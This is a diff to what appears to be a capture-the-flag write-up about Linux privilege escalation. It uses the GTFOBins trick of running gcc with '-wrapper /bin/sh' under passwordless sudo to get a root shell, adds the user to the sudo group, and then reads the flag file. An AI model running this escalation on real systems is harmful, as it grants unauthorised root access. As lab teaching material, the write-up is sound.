@@ -91,18 +91,17 @@ sudo -l
 (ALL) NOPASSWD: /usr/bin/gcc
 ```
 
-[https://gtfobins.github.io/gtfobins/gcc#sudo]
+https://gtfobins.github.io/gtfobins/gcc#sudo
 
-Doopdeedoop:
+Doopdeedoop, let's try that command
 
 ```bash
 gcc -wrapper /bin/sh,-s .
 sudo usermod -aG sudo Pentester
 exit
 exit
-# to log out the pentester. log back in
+# to log out the pentester and apply the new group, then ssh back in.
 ```
-
 
 ```bash
 ssh -p 2222 Pentester@<ip>
@@ -113,26 +112,34 @@ groups
 Pentester sudo
 ```
 
-See what command we can run
+Huzzah. Now what commands can we run as sudo?
 ```bash
 sudo -l
 (ALL) NOPASSWD: /usr/bin/gcc
 ```
 
-Run that again. 
+Run that GTFOBin again. 
+
+And Bam! we're root.  
 
 ---
 
 ### Step 3: Flag Retrieval
 
-Now we have root, the flag's gotta be here somewhere, normally just use find (looking for flag.txt) or grep (looking for FLAG within a file) on the entire file system. 
+Now we are gods, the flag's gotta be here somewhere, normally I use find (looking for flag.txt) or grep (looking for string FLAG within a file) on the entire file system. Trying find first
 
 ```bash
 find / -name flag.txt -type f
 /root/flag.txt
+```
+
+Looks promising. 
+
+```bash
 cat /root/flag.txt
 FLAG{7H15_SUDO_C00K3D_R007}
 ```
+
 ![image](./victory.gif)
 
 
@@ -142,7 +149,7 @@ FLAG{7H15_SUDO_C00K3D_R007}
 
 - Don't be afraid to ask for help when you get blocked. Difficult for you can be easy for someone else and vice versa. 
 - As a team, set up some tools in comms (like threads in channels) to share progress on challenges.
-- Linpeas and gftobins are l337h4x0r
+- Linpeas and gftobins are l337h4x0r was to privesc on linux. 🫶
 
 ---
 
